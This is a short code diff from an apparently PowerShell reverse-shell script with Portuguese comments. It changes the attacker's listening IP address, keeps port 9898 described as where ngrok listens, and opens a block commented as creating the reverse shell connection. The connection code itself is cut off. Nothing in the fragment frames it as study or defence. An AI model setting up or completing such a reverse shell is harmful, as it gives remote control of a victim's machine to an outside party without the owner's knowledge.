@@ -1,4 +1,4 @@
-$ip = "177.26.87.196"  # Seu IP público
+$ip = "172.20.10.11"  # Seu IP público
 $port = 9898  # A porta onde o ngrok está escutando
 
 # Cria a conexão de reverse shell
